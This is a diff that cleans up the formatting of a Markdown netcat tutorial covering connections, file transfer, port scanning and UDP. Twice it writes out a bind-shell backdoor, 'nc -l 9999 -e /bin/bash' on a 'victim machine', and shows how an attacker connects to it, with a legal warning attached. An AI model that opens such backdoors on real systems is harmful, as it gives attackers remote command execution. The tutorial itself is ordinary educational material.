@@ -33,7 +33,7 @@ Netcat is simple to use and an essential tool for anyone interested in network c
 ---
 
 ## Syntax Overview
-```bash
+
 nc [options] [hostname] [port]
 
 Key Options:
@@ -45,91 +45,72 @@ Key Options:
 Common Syntax Patterns:
 Listening for connections:
 
-bash
-Copy code
+
 nc -l [port]
 Example: nc -l 8080 listens on port 8080 for incoming TCP connections.
 
 Connecting to a remote host:
 
-bash
-Copy code
 nc [hostname] [port]
 Example: nc 127.0.0.1 8080 connects to localhost on port 8080.
 
 Transferring files:
 
 Sender:
-bash
-Copy code
+
 nc [receiver_ip] [port] < file_to_send
 Receiver:
-bash
-Copy code
+
 nc -l [port] > received_file
 Port scanning:
 
-bash
-Copy code
 nc -z -v [hostname] [start_port]-[end_port]
 Example: nc -z -v 127.0.0.1 1-100 scans ports 1 to 100 on localhost.
 
 UDP connections:
 
-bash
-Copy code
 nc -u [hostname] [port]
 Example: nc -u 127.0.0.1 9999 establishes a UDP connection on port 9999.
 
 Establishing a backdoor (for demonstration purposes):
 
-bash
-Copy code
 nc -l [port] -e /bin/bash
 Example: nc -l 9999 -e /bin/bash opens a backdoor on port 9999 to execute commands.
 
 Examples
 Create a Connection Using TCP
 Listener:
-bash
-Copy code
+
 nc -l 8080
 Client:
-bash
-Copy code
+
 nc 127.0.0.1 8080
 This establishes a TCP connection between the listener and client.
 
 Create a Connection Using UDP
 Listener:
-bash
-Copy code
+
 nc -l -u 999
 Client:
-bash
-Copy code
+
 nc -u 127.0.0.1 999
 This establishes a UDP connection on port 999.
 
 Transfer Files Between Systems
 Receiver (Linux):
-bash
-Copy code
+
 nc -l 9999 > received.file
 Sender (Mac):
-bash
-Copy code
+
 nc <IP_address> 9999 < file_to_send.file
 This transfers a file from the sender to the receiver.
 
 Port Scanning
 Verbose Scanning:
-bash
-Copy code
+
 nc -v -n 127.0.0.1 1-100
 Zero I/O Mode Scanning:
-bash
-Copy code
+
 nc -z 127.0.0.1 1-100
 This scans for open ports within the specified range.
 
@@ -138,12 +119,10 @@ Establish a TCP connection as shown in the TCP example, and use the terminal to 
 
 Create a Backdoor (Demonstration Only)
 Listener (Victim Machine):
-bash
-Copy code
+
 nc -l 9999 -e /bin/bash
 Attacker Access:
-bash
-Copy code
+
 nc <IP_address> 9999
 Warning: This example is for educational purposes only. Unauthorized use of this functionality is illegal.
 
